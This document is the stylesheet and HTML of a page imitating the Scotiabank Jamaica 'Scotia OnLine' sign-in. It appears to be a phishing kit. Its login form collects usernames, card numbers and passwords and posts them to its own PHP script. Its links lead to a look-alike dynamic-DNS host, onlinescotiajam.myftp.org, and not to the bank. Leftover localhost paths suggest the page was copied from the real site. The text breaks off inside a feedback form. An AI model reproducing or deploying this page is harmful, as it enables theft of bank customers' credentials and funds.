	white-space: pre-wrap!important; 
	width: 85%!important; 
}

.bdp-auth-password-text {
  width: 136px;
  height: 18px;
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.38;
  letter-spacing: normal;
  color: #333333;
}

.bdp-confirm-checkbox {
  position: relative;
  width: 22px;
  height: 22px;
  border-radius: 4px;
  border: solid 1px #c5c5c5;
  vertical-align: middle;
  cursor: pointer;
  background-color: #ffffff; 
}

.bdp-confirm-checkbox1{
	visibility: hidden;
	width: 0 !important;
	height: 0 !important;
	display: none;
}


.bdp-confirm-checkbox:after {
	content:'';
	position:absolute;
	top:2px;left:6px;
	width:7px;
	height:13px;
	opacity:0;
	transform:rotate(45deg) scale(0);
	border-right:2px solid #fff;
	border-bottom:2px solid #fff;
}

.bdp-confirm-checkbox1:checked~.bdp-confirm-checkbox:after{opacity:1;transform:rotate(45deg) scale(1);}
.bdp-confirm-checkbox1:checked~.bdp-confirm-checkbox{background-color:#3b99fc;}
.bdp-confirm-checkbox1:disabled~.bdp-confirm-checkbox{background-color:#ffffff; border-color:#c5c5c5;position:initial;}

.bdp-tandcHolder{height:auto;overflow:visible;}

.bdp-content-area-bg {
  width: 700px;
  height: 229px;
  background-color: #e0e0e0;
  padding-top: 24px;
}

.bdp-combined-shape-host {
  width: 652px;
  height: 117px;
  background-color: #ffffff;
  margin-left: 24px;
}

/*ONLINE Statements*/
.all-tabs div{
	white-space: nowrap;
	display: table-cell;
	padding: 10px;
	vertical-align: middle;
	border-right: 4px solid #ffffff;
	color: #606060;
  	border-collapse: inherit;
}
.tab-inactive{
	background-color: #f5f5f5;
}
.tab-active{
	background-color: #e0e0e0;
}
.all-tabs div:last-child { width: 100%; background-color: #ffffff;}
.stmts-tab-font {
  font-family: Arial;
  font-size: 12px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #606060;
}

.ncf-child-wizard {background: #EFEFEF; padding: 20px;}

.ncf-child-nostatements {background: #EFEFEF; padding: 6%;}
.stmts-table-header{font-family: Arial;
  font-size: 12px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #2a5db0;
}
.ncf-noStatements-text{font-family: Arial;
  font-size: 12px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #000000;
  padding-left:24%;
}

.stmts-table-contents{
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #2a5db0;
}

.amex-merc-apply{
	margin: 16px 180px 0 !important;
}

.amex-merc-bground{
	background:#EFEFEF !important;
	box-shadow: 0 0px 0px !important;

}

.amex-merc-bground-inner{
	background:#FFFFFF !important;
	border-bottom: 1px solid #EFEFEF !important;
}

.amex-homebottomtable {
    margin: 0 2% 0% 0% !important;
}

.username-circle {
  -moz-border-radius: 50px/50px;
  -webkit-border-radius: 50px 50px;
  border-radius: 50px/50px;
  border: solid 1.5px #606060;
  width: 20px;
  height: 20px;
  position: absolute;
}
.username-circle.green{
	border: solid 1.5px #138468;
}
.username-circle.red{
	border: solid 1.5px #d81e05;
}

.username-checkmark-green{
  content: " ";
  display: block;
  width: 0.4em;
  height: 0.8em;
  border: solid #138468;
  border-width: 0 0.1em 0.1em 0;
  position: relative;
  left: 0.5em;
  top: 0.5em;
  margin-top: -0.2em;
  -webkit-transform: rotate(45deg);
  -moz-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  transform: rotate(45deg);
}

.username-crossmark-red{
  padding-left: 0.20em;
  font-size:10px;
  color: #d81e05;
}

.username-username-error-msg{
	color: #D81E05;
	margin: 5px 0 0 2px!important;
	text-align: left!important
}

.username-username-guide-text {
  width: 134px;
  height: 16px;
  font-family: Arial;
  font-size: 13.5px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: normal;
  letter-spacing: 0.29px;
  color: #606060;
}


.username-icon-req-default {
    background-color: #FFF; background: url(../images/icon-req-default.svg)  no-repeat;  position: relative; width: 16px;  height: 16px;  display: block;
}

.username-icon-req-correct {
    background-color: #FFF; background: url(../images/icon-req-correct.svg)  no-repeat;  position: relative; width: 16px;  height: 16px;  display: block;
}

.username-icon-req-wrong {
    background-color: #FFF; background: url(../images/icon-req-wrong.svg)  no-repeat;  position: relative; width: 16px;  height: 16px;  display: block;
}

.hrt-title-text-user-name { font-family: Helvetica; font-size: 14px; color: #606060; padding-bottom: 15px!important;font-weight: bold;}
.userNameNotFoundText{ font-size: 20px;  color: #000000; letter-spacing: 0px; padding-top: 30px;}

.username-confirm-tandcHolder {
	height: 326px;
	background: #fff;
	overflow: auto;
	padding-top: 24px;
	font-size: 14px;
	color: #606060;
	bold: normal;
}

.recipientWarningText { font-size: 20px; color: #000000; letter-spacing: 0; padding-top: 20px; padding-bottom: 5px; padding-left: 100px; }

/*ONLINE Statements*/
.all-tabs div{
	white-space: nowrap;
	display: table-cell;
	padding: 10px;
	vertical-align: middle;
	border-right: 4px solid #ffffff;
	color: #606060;
  	border-collapse: inherit;
}
.tab-inactive{
	background-color: #f5f5f5;
}
.tab-active{
	background-color: #e0e0e0;
}
.all-tabs div:last-child { width: 100%; background-color: #ffffff;}
.stmts-tab-font {
  font-family: Arial;
  font-size: 12px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #606060;
}

.ncf-child-wizard {background: #EFEFEF; padding: 20px;}

.ncf-child-nostatements {background: #EFEFEF; padding: 6%;}
.stmts-table-header{font-family: Arial;
  font-size: 12px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #2a5db0;
}
.ncf-noStatements-text{font-family: Arial;
  font-size: 12px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #000000;
  padding-left:24%;
}

.stmts-table-contents{
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #2a5db0;
}

.amex-merc-apply{
	margin: 16px 180px 0 !important;
}

.amex-merc-bground{
	background:#EFEFEF !important;
	box-shadow: 0 0px 0px !important;

}

.amex-merc-bground-inner{
	background:#FFFFFF !important;
	border-bottom: 1px solid #EFEFEF !important;
}

.amex-homebottomtable {
    margin: 0 2% 0% 0% !important;
}
.changepd-newpwd-default {
    float:left; clear: none; width:100%; background:white;border:1px solid #ccc; border-radius: 4px;height:32px!important
}
.changepd-newpwd-error {
    float:left; clear: none; width:100%; background:white;border:1px solid #D81E05; border-radius: 4px;height:32px!important
}

.icon-intercept-username-create {
    background: url(../images/announcement-icon-new.svg) left center no-repeat; float:left;  width: 47px; height: 33px; margin-right: 20px!important;
    margin-top: 20px;  margin-bottom: 20px;  margin-left: 0px;
 }
	
.mortgageDeful{
    margin-left: 60px;
    margin-right: 60px;
    font-family:Scotia !important;
}
.mortgageDefli{
    line-height: 18px;
    padding-top: 10px;
	font-family:Scotia !important;
}

.exp-collapse1 a:after { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; content: "\f0da"; color: #d81e05; /*do not change this one ---- its reflecting for multiple*/ position: absolute; font-size: 18px; }
.exp-collapse1 a.Open:after { content: "\f0d7" }
.exp-collapse1 h2 a:after { margin: -2px 0 0 7px; font-size: 25px!important; }
.linkColor{
	color:red !important;
	font-size: 16px;
	font-weight: bold;}

.close_icon_cap { background: url(../images/close-icon-cap.png) center top no-repeat; width: 30px; height: 30px; border: 0; float: right; margin: -5px 0 0 0; }

.mortgageDefliConsent{
    line-height: 18px; padding-top: 10px;
    font-family:Scotia !important; font-size: 16px; 
    letter-spacing: 0; line-height: 18px;
}

.refNo-error-msg{
	color: #D81E05; 
	margin: 5px 0 0 2px!important; 
	text-align: left!important;
	width: 65%; 
}

.refNo-box { width: 300px; height: 32px; border-radius: 4px; border: solid 1px #cccccc; background-color: #ffffff; text-align: center;}
.refNo-input-text {outline:none; border:none; width:100%; height: 100%; font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.38; letter-spacing: normal; color: #606060; padding-left:10px;}
.refNo-box.red {border: solid 1px #d81e05;}

.btn-tp-cancel{
	margin-left: 5px;
    width: 90px;
    height: 32px;
    padding-top: 5px;
    border-radius: 4px;
    border: solid 1px #979797 !important;
    background-color: #606060 !important;
}
.btn-tp-back{
	padding-top:7px;
	white-space: nowrap;
	width: 84px;
	height: 32px;
	border-radius: 4px;
	cursor: pointer;
	margin-left:0%; 
	background-color: #606060;
	border: solid 1px #606060;
	float: left;
}
.tp-link-enabled{
        margin-left: 5px;
	width: 84px;
  	height: 32px;
 	border-radius: 4px;
  	background-color: #606060;
  	cursor: pointer;
  	border:0px;
  	padding-top: 8px;}
  
.tp-cancel-div{
	 float: left;
	 padding-left: 61.45%;
	 white-space: nowrap;
} 

.tp-disabled-div{
	padding-top:7px; white-space: nowrap; margin-left: 90.5%;
	width: 84px; height: 32px; border-radius: 4px;padding-left: 5px;
	border: solid 1px #c5c5c5; background-color: #c5c5c5;
}

.tp-red-div{
	padding-top:7px;
	white-space: nowrap; margin-left: 90.5%;
	width: 84px;
  height: 32px;
  border-radius: 4px;padding-left: 5px;
  border: solid 1px #bd0000;
  background-color: #d81e05;
  cursor: pointer;
}

.hrt-title-text-tax-pay {  width: 606px; height: 18px; font-family: Helvetica; font-size: 13px; color: #606060; letter-spacing: normal; padding-bottom: 15px!important;font-weight: normal;}
.hrt-email-text { 
	width: 606px; height: 20px; font-family: Helvetica; font-size: 13px; color: #606060; letter-spacing: -0.12px;font-weight: normal;}

.bdp-migration-tabs-font {
	font-weight: normal;
}

.bdp-migration-user-name {
	font-weight: bold;
}
.bdp-pwd-eye-icon {
	top: 8px; 
	right: 8px;
}

.bdp-auth-bg-in1 {
  background-color: #f5f5f5;
  padding: 20px 20px 24px 20px;
}

.bdp-username-icon-req-correct {
    background-color: #FFF; 
    background: url(../images/icon-req-correct.svg)  no-repeat;  
    position: absolute; 
    width: 16px;  
    height: 16px;  
    display: block;
} 

.bdp-username-icon-req-default {
    background-color: #FFF; background: 
    url(../images/icon-req-default.svg)  no-repeat;  
    position: absolute; 
    width: 16px;  
    height: 16px;  
    display: block;
}

.bdp-username-icon-req-wrong {
    background-color: #FFF; 
    background: url(../images/icon-req-wrong.svg)  no-repeat;  
    position: absolute; 
    width: 16px;  
    height: 16px;  
    display: block;
}

.bdp_success_pg_ht{
	height: 10px !important;
}

.welcome-msg-bdp {
  width: 652px;
  height: 30px;
  font-family: Arial;
  font-size: 24px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #333333;
  padding-top: 40px;
  padding-left: 78px;
}

.icon-position-bdp-success{
	position: absolute;
	margin: 40px 0 0 24px;
}

.cif-update-child-wizard_tax {
	background: #EFEFEF;
}

.tp-service-down {
    width: 95%;
    height: 110px;
    font-family: Arial;
    font-size: 16px;
    font-weight: normal;
    font-stretch: normal;
    font-style: normal;
    line-height: 1.1;
    letter-spacing: normal;
    color: #000000;
    padding-top: 22px;
}

.circle-red{
	border: solid 1px #d81e05;
}

.bp-service-down {
    width: 95%;
    height: 110px;
    font-family: Arial;
    font-size: 16px;
    font-weight: normal;
    font-stretch: normal;
    font-style: normal;
    line-height: 1.1;
    letter-spacing: normal;
    color: #000000;
    padding-top: 44px;
}

.ci_select_installment{
	border-top: 1px solid;
    border-top-color: #E5E5E5;
}

.ci_select_width_ht{
	width: 68%;
    height: 88%;
}

.ci_leap-radio-wrapper { 
	display: block; 
	position: relative; 
	padding-left: 35px; 
	-webkit-user-select: none; 
	-moz-user-select: none; 
	-ms-user-select: none; 
	user-select: none; 
	margin-top: 10px; 
	margin-bottom: 10px
}

.ci_leap-radio-wrapper .leap-radio:after { 
	top: 7px; 
	left: 7px; 
	width: 8px; 
	height: 8px; 
	border-radius: 50%; 
	background: #ffffff; 
}

.ci_leap-radio-wrapper .leap-radio2:after { 
	top: 7px; 
	left: 7px; 
	width: 8px; 
	height: 8px; 
	border-radius: 50%; 
	background: #ffffff; 
}

.ci_font_color{
	color: #000000;
}

.font14{
	font-size: 14px;
}

.font20{
	font-size: 20px;
}

.mrgn-top-55{ 
	margin-top: 55px !important; 
}

.ci_agreement_width{
	width: 86.333333% !important;
}

.ci_info_icon_padding{
	padding: 17px !important;
}

.ci_info_icon_margin{
	margin-left: -26px !important; 
	margin-top: -2px !important;
}

.font13{
	font-size: 13px;
}

.cif-update-child-wizard-1 {
    background: #EFEFEF;
    padding: 20px;
}

.mrgn-lft-neg-18 { 
	margin-left: -18px !important; 
}

.mrgn-lft-3{ 
	margin-left:3px !important;
}

.ci_font_grey_color{
	color: #606060 !important;
}

.ci_modal_scroll{
	max-height: 200px !important;
    overflow: auto;
}

.pad-top-2 {padding-top: 2px !important }

.installment-area-bg {
  width: 100%;
  background-color: #e0e0e0;
}

.installment-combined-shape {
  width: 100%;
  box-shadow: 0 2px 10px 0 rgba(0, 40, 80, 0.07);
  background-color: #ffffff;
}

.icon-info-installment {
    background: url(../images/info-icon-32px.svg) left top no-repeat;
    float: left;
    width: 35px;
    height: 60px;
    margin-right: 15px!important;
    margin-top: 22px;
    margin-bottom: 8%;
    margin-left: 22px;
}


.installment-desc-1 {
    font-size: 16px;
    color: #000000;
    letter-spacing: 0;
    padding-top: 20px;
}
.installment-desc-2 {
	font-size: 13px;
	line-height: 12px;
	color: #606060;
	}
.installment-desc-3 {
	font-size: 13px;
	line-height: 18px;
	color: #2A5DB0;
	padding-top: 5px;
    padding-bottom: 20px;
	}	
	
.no-installment-buttons	{
    padding-bottom: 30px;
}

.no-installment-ok {
  padding: 6px;
  width: 80px;
  margin: 0px!important;
}

.mrgn-lft-pct-16{margin-left: 16.5% !important}
.mrgn-lft-pct-8{margin-left: 8% !important}

.rewards-gift-icon {
    background-color: #FFF; 
    background: url(../images/rewards-icon.svg)  no-repeat; 
    width: 26px;  
    height: 24px;  
    display: block;
}

.mrgn-top-12 { margin-top: 12px !important;}

.rewards_gift_align {
	width: 8.333333333333332%;
    margin-left: 15px;
}

.rewards_scotia_text_align {
	width: 51%;
    margin-top: -22px;
    margin-left: 50px;
}

.rewards_redeem_text_align {
	width: 26.33333333333333%;
    margin-left: 382px;
    margin-top: -52px;
}

.rewards_external_link_align {
	width: 8.333333333333332%;
    margin-left: 480px;
    margin-top: -15px;
}

.rewards_redeem_container {
	height: 90px;
    border: 1px solid #d8d8d8;
    border-radius: 4px;
    padding: 10px 0 0 0;
    font-size: 12px;
    color: #606060!important;
    font-weight: normal!important;
}

.ci_viewmore_margin{
    margin-top: 5%;
    margin-left: 5.7%;
}

.ci_select_tab_scroll {
    max-height: 620px !important;
    overflow: auto;
}

.ecab-mobile-logo{height:24px;width:94px;}
.ecabupdate, .ecabupdate label {font-family: Arial;font-weight: bold;font-size: 24px;color: #000000;letter-spacing: -0.23px;line-height: 27px;}
.ecab-bnscontinue,.ecab-bnscontinue label {font-weight: normal; font-family: arial;font-size: 18px;color: #606060;letter-spacing: -0.17px;line-height: 24px;}
.ecab-updatebnsapplink, ecab-updatebnsapplink:hover, ecab-updatebnsapplink:active{border: 1px solid #ED0722 !important;border-radius: 8px;border-radius: 8px;text-align: center;background: #FFFF;font-size: 16px;width:256px;color: #ED0722 !important;padding:19px 13px;cursor:pointer;font-family:arial;font-weight:bold;line-height:16px;letter-spacing:0px;}
.ecab-bnscallus, .ecab-bnscallus label { font-weight: normal; font-family: arial;font-size: 16px;color: #606060;letter-spacing: -0.15px;text-align: left;line-height: 22px;}
.ecab-bnscallus a { font-weight: normal; font-family: Arial;font-size: 16px;letter-spacing: -0.15px;text-align: center;line-height: 22px;}
.ecab-container-header { background-color: #C88A12 !important; }
.ecab-page-header { height: 49px !important }
.ecab-section{padding:2px !important}
.RUIFW-page-wrap.ecab-page-wrap:before{ height: 49px !important}
.ecab-page-footer{background:#FFF ! important; margin:24px 208px 0px 137px; position: relative !important;min-width: 288px;}
.ecab-page-container{border:0px !important; padding:0px 137px 0 137px;max-width: 976px;min-width: 320px;width: 100%;margin: 0 auto;}

#targetMarketingModalWindow .intercept-container > .RUIFW-row img:first-of-type + div {
	font-family: arial;
	font-size: 14px;
	line-height: 16px;text-align: center;
	color: #333333;
	text-align: center;
	margin-top: 20px;
}

#targetMarketingModalWindow .intercept-container > .RUIFW-row > .RUIFW-col-12 div:nth-of-type(3),
#targetMarketingModalWindow .intercept-container #productBenefitDetails div:nth-of-type(2){
	text-align: center;
	font-family: arial;
    font-size: 14px;
    line-height: 16px;
    color: #2A5DB0;
}

#targetMarketingModalWindow .intercept-container {
    padding: 0 30px 35px;
}

#targetMarketingModalWindow .imgHolder img {
    width: 100%;
}

#targetMarketingModalWindow .intercept-container > h1 {
    text-align: center;
    margin-top: 0;
    font-size: 32px;
    line-height: 36px;
}

#targetMarketingModalWindow .intercept-container > p {
    text-align: center;
    font-size: 16px;
    line-height: 20px;
    margin-top: 15px;
    margin-bottom: 20px;
}

#targetMarketingModalWindow #productBenefitDetails ul li {
    font-size: 14px;
    line-height: 18px;
}

#targetMarketingModalWindow #productBenefitDetails ul li:last-child {
    margin-bottom: 0;
}

#targetMarketingModalWindow #aunth_sect_btns a.btn,
#targetMarketingModalWindow .modal-footer button#tellMeLaterButton {
    padding: 14px;
    height: auto;
}

#targetMarketingModalWindow #productBenefitDetails ul {
    padding-left: 0;
}

#targetMarketingModalWindow #productBenefitDetails li {
    margin-left: 15px;
}
</style>

</head><body>

<div class="RUIFW-page-wrap">
    <header class="RUIFW-container-header" role="navigation"><div id="header" class="RUIFW-page-header"><a class="sr-only RUIFW-skip-main" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#RUIFW-main-content" onclick="#">Skip to main content</a>
        <h1 class="RUIFW-brand RUIFW-col-6 col-sm-6">
          <span class="RUIFW-sr sr-only sr-only">Scotiabank Group</span>
        </h1>
        <div class="RUIFW-col-6 headTopLinks col-sm-6">
<form id="header_links_form" name="header_links_form" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


        <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" id="tcSwitch" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_1&quot;;return this.s_oc?this.s_oc(e):true">Terms and Conditions</a>
       
</form>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_2&quot;;return this.s_oc?this.s_oc(e):true" title="How to contact Scotiabank">Contact Us</a>
              <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_3&quot;;return this.s_oc?this.s_oc(e):true" title="Scotiabank Accessibility Statement">Accessibility</a>
        </div></div>
      <div class="RUIFW-bg-bar hidden-xs">
        <div class="RUIFW-bg-main-nav"></div>
      </div>
      <nav class="RUIFW-container-nav-main">
        <ul class="RUIFW-nav-main nav navbar-nav nav navbar-nav">
          <li class="" id=""></li>
        </ul>
      </nav>
    </header>
    <section id="RUIFW-main-content" class="RUIFW-container-main" tabindex="-1"><div id="messages" class="success-msg"></div><div id="messages01" class="success-msg divOff"></div>

 <div id="content_block">
<form id="contentForm" name="contentForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">




	<div id="cmContentOnlyW1">
	</div>
	
	<h1 class="RUIFW-col-9 col-sm-9">Sign In to Scotia OnLine (Jamaica)</h1>

	<div class="RUIFW-content-main RUIFW-col-9 col-md-9 col-sm-9">


		<div class="wizard-form-content wrapfrom">
			<div class="RUIFW-row row"><div class="RUIFW-col-6 vertical-separator col-sm-6">
					<div class="RUIFW-row row">
											<div class="RUIFW-col-12 col-sm-12 col-sm-12">
    
                            <label id="contentForm:scotiacard_SG" style="width:300px;">Username or ScotiaCard number</label>
                            <input id="contentForm:nscard" type="text" name="usrd" autocomplete="off" class="RUIFW-form-el RUIFW-input-lg form-control form-control" maxlength="32" size="32"><div class="pad-2px mrgn-top-5"><a id="contentForm:recover_user_SG" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#">Forgot your username?</a></div>
			

							
							
							

							
							<div class="RUIFW-input-lg">
							</div>
							
						</div>
					</div>


					
					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 col-sm-12"><label>Password:</label><div id="contentForm:pwField" class="RUIFW-input-lg">
                            <input id="contentForm:pwdnMasked" type="password" name="pswrd" autocomplete="off" value="" maxlength="32 size=" 32"="" class="RUIFW-form-el form-control"></div>

							<div class="pad-2px mrgn-top-5"><a id="contentForm:forgottenPassword_activate_AUTH" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#">Forgot your password?</a>
							</div>
						</div>
					</div>
                    <div style="margin-top: 18px">
                        <div class="">
							<span style="left center no-repeat; float:left;  width: 30px; height: 33px;t;" onclick="rememberMeCheck(&#39;remember&#39;)"><input name="contentForm:j_idt176" class="alcbx-alcrb1" id="remember" type="checkbox">
								<label for="remember" class="margin-left-8 alcbx-alcrb" style="min-height:18px;"></label>
							</span>
							<div class="">
								<span id="register" onclick="rememberMeCheck(&#39;remember&#39;)"><label style="font-size: 12px;font-weight:normal;color: #606060;letter-spacing: 0;line-height: 19px;">Remember my username or card number (Optional)</label>
								</span>
								<div style="margin-left:30px;margin-top:5px;"><span style="font-size: 12px;color: #606060;line-height: 19px;"><b>IMPORTANT: Not advised for public computers</b></span>
								</div>
							</div>
                        </div>
                    </div>
                    
					<div id="nicknameField" class="divOff" style="margin-top:10px;">
						<div class="RUIFW-row row">
							<div class="RUIFW-col-10 col-sm-10">
								<label style="font-size:12px;">Card number too long? Nickname your card</label><div id="contentForm:rmcField1" class="RUIFW-inline"><input id="contentForm:nickname" type="text" name="usrid" autocomplete="off" value="" class="RUIFW-form-el form-control form-control" maxlength="8" size="16"></div>
							</div>
						</div>
					</div>
					<br>

					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 col-sm-12">
						

						</div>
					</div></div>
				<div class="RUIFW-col-6 col-sm-6">
					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 mrgn-top-20 col-sm-12"><span id="contentForm:newToScotiaWeb" class="">New to Scotia OnLine?</span>
							<br><a id="contentForm:activate_AUTH" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#">Enroll now</a>
						</div>
					</div>
				</div>
			</div>
			<div class="clear"></div>
			<br>

			
			<div class="btn-holder">
                <!-- <a id="contentForm:signIn" href="http://localhost:8080/phpSite/scotis/#" class="RUIFW-btn-primary btn btn-primary">Sign In</a> -->
                <input class="RUIFW-btn-primary btn btn-primary" placeholder="Sign In" type="submit">
			</div>
           

		</div>
		<div id="cmContentOnlyW2">
		</div><span class="gap"></span>


	</div>
	


 <!-- <div class="RUIFW-content-side RUIFW-col-3 col-md-3 col-sm-3" id="default_page_content_right_sideid"><span id="rightSideContent">
       <div id="cmContentOnly1">
        </div>
         <div class="right-box">
        <div class="exp-collapse">
          <h4>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" class="Open">Security Guarantee</a>
          </h4>
        </div>
        <div id="scotia_security" class="RUIFW-container-well fade right-box-item-holder in" aria-hidden="false">
          <ul class="right-box-item">
            <li class="rightbox-icon-lock"><span>We're committed to keeping your financial information safe and secure.</span></li>
            <li class="more-link"><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_5&quot;;return this.s_oc?this.s_oc(e):true" title="Learn More">Learn More</a></li>
        	
          </ul>
        </div></div>
      
      <div id="cmContentOnly2">
        </div>
     <div id="help_section_div" class="right-box">
        <div class="exp-collapse">
          <h4>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" class="" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_6&quot;;return this.s_oc?this.s_oc(e):true">Need Help?</a>
          </h4>
        </div>
        <div id="help_section" class="RUIFW-hide RUIFW-container-well fade right-box-item-holder" aria-hidden="true">
          <ul class="right-box-item">
            <li><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_7&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" title="Help with this page">Help with this page</a></li>
            <li class="rightbox-icon-video"><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_8&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" title="How-to video">How-to video</a></li>
          </ul>
        </div>
      </div> 
      <div id="cmContentOnly3">
      </div>
      <div class="right-box noprint">
         <div class="exp-collapse">
          <h4>
            <a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_9&quot;;return this.s_oc?this.s_oc(e):true" class="" href="http://localhost:8080/phpSite/scotis/javascript:undefined;">Contact Us</a>
          </h4>
        </div>
        <div id="contact_us" class="RUIFW-hide RUIFW-container-well fade right-box-item-holder" aria-hidden="true">
          <ul class="right-box-item">
            <li class="rightbox-icon-phone"><span>Call us at (876) 960-2675 or Toll free 1-888-472-6842</span></li>
            <li class="rightbox-icon-comment"><a id="general_feedback_rhs_link" title="General Feedback" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_10&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" aria-hidden="false">General Feedback</a></li>
            <li class="more-link"><a title="More" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_11&quot;;return this.s_oc?this.s_oc(e):true" aria-hidden="false">More</a></li>
          </ul>
        </div>
      </div> 
      <div id="cmContentOnly4">
      </div></span>
    </div> -->
	<div class="RUIFW-modal divOff modal fade modal fade" id="feedbackModalDialog" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static" style="display: none;">
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
<form id="feedbackForm" name="feedbackForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">

					<div class="RUIFW-modal-header modal-header modal-header"><a id="feedbackForm:headerCloseLink" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="close_icon"></a>
						<h4 class="RUIFW-modal-title modal-title modal-title" id="feedbackModalLogo">
							<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
						</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						<h1>Feedback</h1><div id="feedbackForm:feedBackBannerMsg"></div>

						<p>Your feedback is important to us as we will use it to make improvements. Note we will not reply to individual submissions. If you need assistance, please call our Contact Centre.</p>
						<ul id="feedbackTabs" class="RUIFW-nav-tabs nav nav-two-tabs mrgn-top-20 nav nav-tabs nav nav-tabs">
							<li class="active"><a href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#suggestionTab" data-toggle="tab" onclick="#">Suggestion</a></li>
							<li class=""><a href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#problemTab" data-toggle="tab" onclick="#">Problem</a></li>
						</ul>
						<div class="RUIFW-tab-content tab-content wizard_top_border mrgn-top-minus1 wrapfrom tab-content tab-content">
							<div class="RUIFW-tab-pane fade tab-pane active in tab-pane fade tab-pane fade" id="suggestionTab">
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:sugMsgColBlock" class="RUIFW-col-7 col-sm-7 col-sm-7">
										<label id="fb_label_description">Suggestion description <span class="red-text">*</span></label>
										<div><textarea id="feedbackForm:suggestionText" name="feedbackForm:suggestionText" class="RUIFW-from-el form-control maxLengthCheck" cols="50" rows="6" placeholder="Write your ideas here." maxlength="400"></textarea><span id="feedbackForm:fb_suggestion_errorId"></span>
										</div></div>
								</div>
									<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:sUNameBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
											<label>Your full name <span class="form-alt-txt">(optional)</span></label>
											<div>
                                                <input id="feedbackForm:sCustName" type="text" name="feedbackForm:sCustName" class="RUIFW-from-el form-control" maxlength="50"><span id="feedbackForm:fb_username_errorId"></span>
											</div></div>
